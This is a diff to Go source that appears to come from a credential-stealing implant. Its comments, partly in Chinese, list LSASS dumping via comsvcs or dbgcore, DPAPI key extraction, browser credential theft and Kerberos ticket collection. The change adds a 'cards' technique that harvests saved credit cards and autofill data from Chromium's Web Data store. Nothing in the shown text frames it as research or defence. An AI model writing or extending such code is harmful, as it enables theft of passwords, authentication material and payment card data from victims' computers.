@@ -25,7 +25,7 @@ import (
 //
 //	lsass   : auto | comsvcs | dbgcore
 //	dpapi   : keys
-//	browser : all | chrome | edge | firefox
+//	browser : all | chrome | edge | firefox | cards（cards = Web Data：信用卡 + 自动填充）
 //	ticket  : files（MIT ccache 文件；Windows 原生 LSA 票据不在此列）
 func CmdCredDump(cmdBuf []byte) ([]byte, error) {
 	parts := strings.SplitN(string(cmdBuf), "|", 3)
@@ -85,7 +85,8 @@ func credTechAllowed(kind, tech string) bool {
 	case "dpapi":
 		return tech == "keys"
 	case "browser":
-		return tech == "all" || tech == "chrome" || tech == "edge" || tech == "firefox"
+		// cards = Chromium 的 Web Data（信用卡 + 自动填充），单独开关
+		return tech == "all" || tech == "chrome" || tech == "edge" || tech == "firefox" || tech == "cards"
 	case "ticket":
 		return tech == "files"
 	default:
